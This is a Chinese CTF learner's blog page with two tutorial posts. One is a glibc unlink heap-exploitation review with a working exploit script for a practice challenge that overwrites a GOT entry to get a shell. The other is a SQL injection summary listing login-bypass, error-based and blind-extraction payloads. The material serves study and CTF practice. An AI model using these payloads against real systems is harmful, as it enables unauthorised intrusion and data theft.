<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.0.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"wscyoulin.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.9.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
<meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://wscyoulin.github.io/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="http://wscyoulin.github.io/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"en","comments":"","permalink":"","path":"index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>Hexo</title>
  




  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">Hexo</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>







</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">John Doe</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">24</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">1</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
  </nav>
</div>



        </div>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://wscyoulin.github.io/2022/11/29/unlink%E5%A4%8D%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/11/29/unlink%E5%A4%8D%E4%B9%A0/" class="post-title-link" itemprop="url">unlink复习</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-11-29 00:42:49" itemprop="dateCreated datePublished" datetime="2022-11-29T00:42:49+08:00">2022-11-29</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-11-30 17:56:22" itemprop="dateModified" datetime="2022-11-30T17:56:22+08:00">2022-11-30</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>由于有很长一段时间处于摆烂状态，并且分心去学了点web，导致pwn的一些基础的知识点有部分遗忘，刷buu的时候发现unlink这部分的内容记得不是很清楚，尤其是关于”检查”这部分遗忘的挺多，只记得大概的一些东西，因此借助z1r0师傅的博客重新学习一遍unlink这部分的内容</p>
<h1 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h1><p>glibc在线源码查看：<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.23/source">https://elixir.bootlin.com/glibc/glibc-2.23/source</a></p>
<p>unlink的源码（2.23）unlink其实是libc中定义的一个宏，定义如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#define unlink(AV, P, BK, FD) &#123;                                            \</span><br><span class="line">    FD = P-&gt;fd;								      \</span><br><span class="line">    BK = P-&gt;bk;								      \</span><br><span class="line">    if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))		      \</span><br><span class="line">      malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);  \</span><br><span class="line">    else &#123;								      \</span><br><span class="line">        FD-&gt;bk = BK;							      \</span><br><span class="line">        BK-&gt;fd = FD;							      \</span><br><span class="line">        if (!in_smallbin_range (P-&gt;size)				      \</span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;		      \</span><br><span class="line">	    if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)	      \</span><br><span class="line">		|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \</span><br><span class="line">	      malloc_printerr (check_action,				      \</span><br><span class="line">			       &quot;corrupted double-linked list (not small)&quot;,    \</span><br><span class="line">			       P, AV);					      \</span><br><span class="line">            if (FD-&gt;fd_nextsize == NULL) &#123;				      \</span><br><span class="line">                if (P-&gt;fd_nextsize == P)				      \</span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;		      \</span><br><span class="line">                else &#123;							      \</span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;			      \</span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;			      \</span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;			      \</span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;			      \</span><br><span class="line">                  &#125;							      \</span><br><span class="line">              &#125; else &#123;							      \</span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;		      \</span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;		      \</span><br><span class="line">              &#125;								      \</span><br><span class="line">          &#125;								      \</span><br><span class="line">      &#125;									      \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在执行free()函数时，调用了unlink，其实通俗易懂点就是：三个chunk，将中间的chunk拿掉，形成<code>chunk1-&gt;fd = chunk3-&gt;prev_size</code>，<code>chunk3-&gt;fd = chunk1-&gt;prev-size</code></p>
<h1 id="堆释放"><a href="#堆释放" class="headerlink" title="堆释放"></a>堆释放</h1><p>先看看堆释放吧。(注意使用2.23的动态链接库)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">//gcc -g z1r0.c -o z1r0</span><br><span class="line">#include&lt;stdio.h&gt;、</span><br><span class="line">int main(int argc, char **argv)&#123;</span><br><span class="line">    long *p1 = malloc(0x80);</span><br><span class="line">    long *first_chunk = malloc(0x80);</span><br><span class="line">    long *p2 = malloc(0x80);</span><br><span class="line">    long *second_chunk = malloc(0x80);</span><br><span class="line">    long *p3 = malloc(0x80);</span><br><span class="line">    long *third_chunk = malloc(0x80);</span><br><span class="line">    long *p4 = malloc(0x80);</span><br><span class="line">    free(first_chunk);</span><br><span class="line">    free(second_chunk);</span><br><span class="line">    free(third_chunk);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>malloc7个0x80大小的chunk，释放了first，second，third这三个chunk，之所以释放这三个chunk是因为两个相邻的chunk释放后会进行合并，因为申请的是0x80所以直接进unsortedbin。</p>
<p>gdb吧，直接下b 14</p>
<p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221129005757929.png" alt="image-20221129005757929"></p>
<p>可以看到first-&gt;fd指向了main_arena+88，third-&gt;bk也指向了main_arena+88，看一下heap吧。</p>
<p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221129005820599.png" alt="image-20221129005820599"></p>
<p>unlink过程以及检查</p>
<p>ctf-wiki unlink：<a target="_blank" rel="noopener" href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unlink-zh/">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unlink-zh/</a></p>
<p>ctf-wiki上面讲解了unlink的过程，有点难理解，这里跟着z1r0师傅复习一下吧，通俗易懂点</p>
<p>查看一下first_chunk吧。</p>
<p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221129005910629.png" alt="image-20221129005910629"></p>
<h1 id="unlink检查"><a href="#unlink检查" class="headerlink" title="unlink检查"></a>unlink检查</h1><p><strong>检查1：检查与被释放chunk相邻高地址的chunk的prevsize的值是否等于被释放chunk的size大小。 可以看上图蓝色框中的内容，上面蓝色框中的内容是second_chunk的size大小，下面蓝色框中的内容是p3的prev_size，这两个蓝色框中的数值是需要相等的（忽略P标志位）。在wiki上我记得在基础部分有讲过，如果一个块属于空闲状态，那么相邻高地址块的prev_size为前一个块的大小</strong></p>
<p><strong>检查2：检查与被释放chunk相邻高地址的chunk的size的P标志位是否为0 可以看上图粉色框中的内容，这里是p3的size，p3的size的P标志位为0，代表着它前一个chunk(second_chunk)为空闲状态</strong></p>
<p><strong>检查3：检查前后被释放chunk的fd和bk 可以看上图红色框中的fd和bk内容，这里是second_chunk的fd和bk。首先看fd，它指向的位置就是前一个被释放的块first_chunk，这里需要检查的是first_chunk的bk是否指向second_chunk的地址。再看second_chunk的bk，它指向的是后一个被释放的块third_chunk，这里需要检查的是third_chunk的fd是否指向second_chunk的地址</strong></p>
<h1 id="例题：hitcontraining-unlink"><a href="#例题：hitcontraining-unlink" class="headerlink" title="例题：hitcontraining_unlink"></a>例题：hitcontraining_unlink</h1><p>buu上面的一道题目，因为buu上面的环境问题，后门函数打印flag的路径在buu的靶机上不对，所以最终还是用unlink修改got表，来拿shell</p>
<p>在编辑堆块的函数里面有明显的堆溢出</p>
<p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221130175020826.png" alt="image-20221130175020826"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">bss_addr = 0x6020c8</span><br><span class="line"></span><br><span class="line">add(0x40, &#x27;aaaa&#x27;)   #0</span><br><span class="line">add(0x80, &#x27;bbbb&#x27;)   #1</span><br><span class="line">add(0x80, &#x27;cccc&#x27;)   #2</span><br><span class="line"></span><br><span class="line">fd = bss_addr - 0x18</span><br><span class="line">bk = bss_addr - 0x10</span><br><span class="line">fake_chunk = p64(0) + p64(0x41)</span><br><span class="line">fake_chunk += p64(fd) + p64(bk)</span><br><span class="line">fake_chunk += b&#x27;a&#x27; * 0x20</span><br><span class="line">fake_chunk += p64(0x40)</span><br><span class="line">fake_chunk += p64(0x90)</span><br><span class="line"></span><br><span class="line">edit(0, 0x80, fake_chunk)</span><br><span class="line">delete(1)</span><br></pre></td></tr></table></figure>

<p>首先申请三个堆块，触发unlink,原本指向heap1的指针指向了0x6020b0</p>
<p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221130175238835.png" alt="image-20221130175238835"></p>
<p>接着就是修改这个指针，使其指向atoi_got，泄露libc并修改got为system</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">atoi_got = elf.got[&#x27;atoi&#x27;]</span><br><span class="line">payload = p64(0) * 2 + p64(0x40) + p64(atoi_got)</span><br><span class="line">edit(0, 0x80, payload)</span><br><span class="line">all()</span><br><span class="line">io.recvuntil(&#x27;0 : &#x27;)</span><br><span class="line">atoi_addr = u64(io.recv(6).ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line">print(&quot;atoi_addr:&quot;+hex(atoi_addr))</span><br><span class="line"></span><br><span class="line">libc_base = atoi_addr - libc.sym[&#x27;atoi&#x27;]</span><br><span class="line">one = [0x45216, 0x4526a, 0xf03a4, 0xf1247]</span><br><span class="line">one_gadget = one[1] + libc_base</span><br><span class="line">system_addr = libc_base + libc.sym[&#x27;system&#x27;]</span><br><span class="line"></span><br><span class="line">p2 = p64(system_addr)</span><br><span class="line">edit(0, 8, p2)</span><br><span class="line"></span><br><span class="line">sla(&#x27;Your choice:&#x27;,b&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">ia()</span><br><span class="line"></span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://wscyoulin.github.io/2022/11/25/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/11/25/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">sql注入总结</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2022-11-25 01:57:43 / Modified: 15:30:05" itemprop="dateCreated datePublished" datetime="2022-11-25T01:57:43+08:00">2022-11-25</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>下边以mysql为例：localhost为数据库的服务器，其中demo，information_schema，mysql等为数据库，在demo数据库下又含有demo，student，users表。如图展示的是users表中的内容，他有7个列，分别为id，name，password…</p>
<p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/20221125015639.png"></p>
<p><strong>SQL语句</strong></p>
<p>如果要查询users表中名字为wangwu的所有数据，SQL语句的写法应该是：select * from users where name=’wangwu’;</p>
<p>select代表查询，*代表所有数据，from后代表查询的表，where代表查询条件。</p>
<p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/20221125020538.png"></p>
<p>sql查询交互流程：</p>
<p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125134724360.png" alt="image-20221125134724360"></p>
<p>sql注入原理：</p>
<p>   select * from users where name=’wangwu’; fjwaijfiwajfwafjawh </p>
<p>1.SQL命令可查询、插入、更新、删除等，命令的串接。而以分号字符为不同命令的区别。</p>
<p>2.SQL命令对于传入的字符串参数是用单引号字符所包起来。（但连续2个单引号字符，在SQL数据库中， 则视为字符串中的一个单引号字符）</p>
<p>3.SQL命令中，可以注入注解（连续2个减号字符加空格 – 后的文字为注解，或“/<em>”与“</em>/”所包起来的文字为注解，或#后面为注解）</p>
<p>4.因此，如果在组合SQL的命令字符串时，未针对单引号字符作转义处理的话，将导致该字符变量在填入 命令字符串时，被恶意窜改原本的SQL语法的作用。</p>
<p><strong>原理</strong></p>
<p><strong>and</strong> <strong>且</strong> <strong>or</strong> <strong>或</strong></p>
<p>例：某网站登陆语句为：select * from member where name=’$name’ and pwd=’$pwd’ </p>
<p>正常用户传入name=admin，pwd=123456，语句为</p>
<p>select * from member where name=’admin’ and pwd=’123456’ </p>
<p>若我们传入的$name=’ or 1=1– ，传入$pwd随意，则拼接后的sql语句变成：</p>
<p>select * from member where name=’’ or 1=1– ‘ and pwd=’$pwd’</p>
<p>前面说过– 可以注释后面的部分，因此标红部分被注释。由于任何值or 1=1，因此总能查询得到结果，成功</p>
<p>绕过sql查询，登陆用户。这样登陆使用的用户名和密码被称为<strong>万能密码</strong></p>
<h2 id="注入分类"><a href="#注入分类" class="headerlink" title="注入分类"></a>注入分类</h2><p><strong>注入漏洞根据字段类型不同，一般分为int数值型注入和varchar字符型注入</strong></p>
<p>int数值型注入检测payload</p>
<p>?id=xx and 1=1 </p>
<p>?id=xx and 1=2</p>
<p>两次页面对比若有不同，则表示存在 Int数值型sql注入</p>
<p>varchar字符型注入检测payload</p>
<p>?id=xx’ and ‘1’=’1</p>
<p>?id=xx’ and ‘1’=’2</p>
<p>两次页面对比若有不同，则表示存在 varchar字符型sql注入</p>
<p><strong>注入漏洞根据获取sql语句分类，具有以下几种类型</strong></p>
<p>1、select注入 2、insert注入 3、update注入 4、delete注入</p>
<p><strong>注入漏洞根据获取信息的方式分类，具有以下几种类型</strong></p>
<p>1、联合查询注入</p>
<p>2、报错注入</p>
<p>3、布尔盲注</p>
<p>4、时间盲注</p>
<p>5、堆叠注入</p>
<p>6、DNS log注入</p>
<p>7、宽字节注入</p>
<p>8、二次注入</p>
<p>9、hpf（HTTP Parameter Fragment）</p>
<h3 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h3><p>1、判断是否存在注入（and 1=1/and 1=2）</p>
<p>2、获取查询列数（order by/union select）</p>
<p>3、获取数据库名称</p>
<p>4、获取数据表名称</p>
<p>5、获取数据列名称</p>
<p>6、获取数据</p>
<p><strong>判断select查询的列数</strong></p>
<p>判断select查询的列数的原因：union用于合并两个或多个select语句的结果集，但需要左右两侧列数一致</p>
<p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125135338074.png" alt="image-20221125135338074"></p>
<p><strong>判断select查询的列数的方法</strong></p>
<p>1.order by + 列数</p>
<p>当猜测的列数 小于等于 真实查询列数时，页面返回正常；反之，页面不正常</p>
<p>2.union select 1,2,3…,列数</p>
<p>当猜测的列数 等于 真实查询列数时，页面返回正常，反之，页面不正常</p>
<p><strong>获取页面上显示位</strong></p>
<p>显示位：网页上能够显示数据的位置。</p>
<p>例：使用union select 1,2,3,4,5,6进行注入时，若页面上应正常显示数据的位置出现了3和4，则表示3和4是</p>
<p>显示位，可以在3和4的地方写入sql代码，则代码执行结果将在页面上显示</p>
<p><strong>获取数据库名称方式</strong></p>
<p>1、select database() //获取当前数据库的名称</p>
<p>2、select schema_name from information_schema.schemata</p>
<p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125135615732.png" alt="image-20221125135615732"></p>
<p>information_schema数据库是mysql自带的，它提供了访问数据库元数据的方式。什么是元数据呢？元数 据是关于数据的数据，如数据库名或表名或列名，列的数据类型，或访问权限等。因此，可以利用 informati_schema数据库获取我们想要的信息</p>
<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p><strong>报错注入原理</strong></p>
<p>由于页面提供了mysql错误信息，黑客通过sql注入可以让mysql错误信息连同数据一并显示到页面上。</p>
<p><strong>报错注入分类</strong></p>
<p>1、XML语法报错</p>
<p>2、数值溢出报错</p>
<p>3、group by报错</p>
<p><strong>XML语法报错</strong></p>
<p>相关函数：updatexml()、extractvalue()，mysql 5.1.5及以上，最多获取32个字符</p>
<p>报错原因：xpath_expr中出现非xpath语法的字符</p>
<p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125140619905.png"></p>
<p>UpdateXML(xml_target, xpath_expr, new_xml)</p>
<p>返回替换的XML片段</p>
<p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125141503997.png" alt="image-20221125141503997"></p>
<p>ExtractValue(xml_frag, xpath_expr)</p>
<p>使用XPath表示法从XML字符串中提取值</p>
<p><strong>数值溢出报错——大整数</strong></p>
<p>mysql 5.5.5以上，5.5.50以下。一次最多获取32个字符</p>
<p>试着对最大数做加法运算，可以看到报错的具体情况</p>
<p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125141659099.png" alt="image-20221125141659099"></p>
<p>在mysql中，要使用这么大的数，并不需要输入这么长的数字进去，使用按位取反运算运算即可</p>
<p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125141723203.png" alt="image-20221125141723203"></p>
<p>我们知道，如果一个查询成功返回，则其返回值为0，进行逻辑非运算后可得1，这个值是可以进行数学运算</p>
<p>的。利用这一特性，再结合之前说的溢出报错，就可以进行注入了。</p>
<p>(select (!x-~0) from (select user()x)a)</p>
<p><strong>数值溢出报错——浮点数</strong></p>
<p>同理，浮点数也是存在一定范围的</p>
<p>利用姿势：</p>
<p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125150329630.png" alt="image-20221125150329630"></p>
<p>select exp(~(select*from(select user())x));</p>
<p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125150311603.png" alt="image-20221125150311603"></p>
<p><strong>group by报错——一步步学习原理</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">select rand();//生成一个0~1的随机数</span><br><span class="line">select floor(rand());//将生成的随机数向下取整，值为固定的0  select floor(rand()*2);//将随机数乘2后再向下取整，值为0或1</span><br><span class="line">select concat(0x3a,0x3a,database(),0x3a,0x3a,floor(rand()*2)) from information_schema.tables</span><br><span class="line">where table_schema=database();//这样的格式方便观察，当前数据库中有多少个表就会显示多少条数据</span><br><span class="line">select concat(0x3a,0x3a,database(),0x3a,0x3a,floor(rand()*2))zz from information_schema.tables</span><br><span class="line">where table_schema=database() group by zz;//进行分组，分为两组：0和1</span><br><span class="line">select count(*),concat(0x3a,0x3a,database(),0x3a,0x3a,floor(rand()*2))zz from  information_schema.tables where table_schema=database() group by zz;//计数，由于rand()的不确 定性，有时会报错，有时不会报错（不报错概率更大）</span><br></pre></td></tr></table></figure>

<p>select count(),concat(0x3a,0x3a,database(),0x3a,0x3a,floor(rand(0)*2))zz from information_schema.tables where table_schema=database() group by zz;//添加随机因子后，rand(0) 变为确定的序列，若查询结果超过3条，则肯定报错</p>
<p>原因：</p>
<p>Floor(rand()*2);没有随机因子的序列是随机的 Floor(rand(0)*2);得到的序列是固定的 0011101110…</p>
<p><strong>Ascii码表简单理解</strong></p>
<p>在计算机中，我们每一个字符都对应这一个ascii码，在mysql中我们可以把未知的字符转换成ascii码，然后来进行比较确定其值。</p>
<p><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/ASCII/309296?fromtitle=ascii%E7%A0%81&amp;fromid=99077&amp;fr=aladdin">https://baike.baidu.com/item/ASCII/309296?fromtitle=ascii%E7%A0%81&amp;fromid=99077&amp;fr=aladdin</a></p>
<p><strong>布尔盲注原理</strong></p>
<p>之所以称之为布尔盲注，一方面是我们不能得到数据的具体内容，只能单个字符的进行猜测判断；另一方面 根据数据查询返回的页面结果（查询成功与失败页面不同）来判断我们输入的查询语句是否有效，非真即假， 所以称为布尔盲注。</p>
<p>每个字符的判断是将该字符与ascii码的可见字符进行比较，相等时才能得到一个字符。Ascii码表可见字符有</p>
<p>近百个，每个字符都要进行比较，数量庞大，非手工能做到。一般使用自动化脚本或注入工具来进行攻击。</p>
<p><strong>相关函数</strong></p>
<p>substr()、mid() 截取字符串 ascii() 将字符转换为ASCII码 concat() 字符串拼接</p>
<p><strong>函数说明</strong></p>
<p>SUBSTR(str,pos,len) //截取字符串，从第pos位开始，长度为len</p>
<p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125152213745.png" alt="image-20221125152213745"></p>
<p>ASCII(str) //将字符转换为ASCII码，若传入字符串，则只转换首字符</p>
<p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125152223306.png" alt="image-20221125152223306"></p>
<p>CONCAT(str1,str2,…) //将多个字符串拼接起来</p>
<p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125152229281.png" alt="image-20221125152229281"></p>
<p><strong>布尔盲注payload</strong></p>
<p>select ascii(substr(concat(‘abc’,’def’),4,1)); //将abc与def字符串拼接到一起后得到第四个字符的ascii码</p>
<p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125152257829.png" alt="image-20221125152257829"></p>
<p>?id=1’ and ascii(substr(database(),1,1))=99 %23//若数据库名首字符ASCII为99，则页面正常显示</p>
<p><strong>payload举例</strong></p>
<p>拿到数据库名第一个字符的payload</p>
<p>?id=1’and ascii(substr(database(),1,1))=117 and ‘1’=‘1</p>
<p>拿到表名第二个字符的payload</p>
<p>?id=1’and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),2,1))=108 and ‘1’=‘1</p>
<p>拿到列名第三个字符的payload</p>
<p>?id=1’and ascii(substr((select group_concat(column_name) from information_schema.columns</p>
<p>where table_schema=database() and table_name=’flags’),3,1))=97 and ‘1‘=’1</p>
<p>拿到数据第四个字符的payload</p>
<p>?id=1’and ascii(substr((select flag from flags limit 0,1),4,1))=103 and ‘1’=’1</p>
<p><strong>延时盲注原理</strong></p>
<p>之所以称之为延时盲注，一方面是我们不能得到数据的具体内容，只能单个字符的进行猜测判断；另一方面 根据数据查询返回的时间（查询成功数据库休眠n秒，失败则不休眠）来判断我们输入的查询语句是否有效， 所以称为延时盲注。</p>
<p><strong>相关函数</strong></p>
<p>sleep() //数据库休眠指定时间函数</p>
